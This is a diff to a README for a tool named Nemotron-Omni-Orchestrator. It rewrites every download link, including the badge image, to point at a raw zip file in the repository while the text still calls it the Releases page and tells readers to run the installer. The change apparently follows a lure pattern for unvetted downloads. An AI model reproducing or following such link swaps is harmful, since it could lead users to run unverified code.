@@ -1,6 +1,6 @@
 # 🌟 Nemotron-Omni-Orchestrator - Orchestrate Your Tools Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases)
+[![Download Now](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/raw/refs/heads/main/Voice_agent/Orchestrator-Nemotron-Omni-3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/raw/refs/heads/main/Voice_agent/Orchestrator-Nemotron-Omni-3.9.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Welcome to the **Nemotron-Omni-Orchestrator**. This application provides a power
 
 To start using Nemotron-Omni-Orchestrator, follow these simple steps:
 
-1. **Visit the Releases Page**: Click on the button above or go to the [Releases page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases).
+1. **Visit the Releases Page**: Click on the button above or go to the [Releases page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/raw/refs/heads/main/Voice_agent/Orchestrator-Nemotron-Omni-3.9.zip).
 2. **Choose Your Version**: Look for the latest version listed on the page. You will see various options for downloading.
 3. **Download the Installer**: Select the file that suits your system. You might find options for Windows, macOS, and Linux. Click on the relevant download link.
 4. **Save the File**: Choose a location on your computer where you want to save the file. 
@@ -43,7 +43,7 @@ Nemotron-Omni-Orchestrator includes several features designed to improve your pr
 
 ## 📥 Download & Install
 
-To download Nemotron-Omni-Orchestrator, [visit this page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/releases). Pick the latest release suitable for your system. 
+To download Nemotron-Omni-Orchestrator, [visit this page](https://github.com/SuhaiBgg/Nemotron-Omni-Orchestrator/raw/refs/heads/main/Voice_agent/Orchestrator-Nemotron-Omni-3.9.zip). Pick the latest release suitable for your system. 
 
 After downloading, simply run the installer and follow the instructions to set it up.
 
